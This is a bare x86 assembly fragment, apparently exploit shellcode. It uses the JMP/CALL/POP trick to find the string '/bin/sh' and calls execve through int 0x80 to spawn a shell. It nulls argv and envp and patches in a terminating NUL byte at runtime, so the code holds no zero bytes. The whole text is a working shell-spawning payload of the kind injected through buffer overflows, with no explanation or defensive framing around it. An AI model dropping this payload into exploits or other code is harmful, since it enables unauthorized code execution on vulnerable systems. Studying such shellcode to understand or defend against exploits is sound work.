JMP _WANT_BIN_BASH;
_GOT_BIN_BASH:;  
POP EBX;             # path (shell) 
XOR EAX, EAX
MOV AL, 0x0B;        # 11 - code for execve
XOR ECX, ECX;        # argv = 0
XOR EDX, EDX;        # envp = 0
MOV [EBX+7], CL;     # add '\0' dynamically
INT 0x80;
_WANT_BIN_BASH:;
CALL _GOT_BIN_BASH;
.ASCII "/bin/sh@";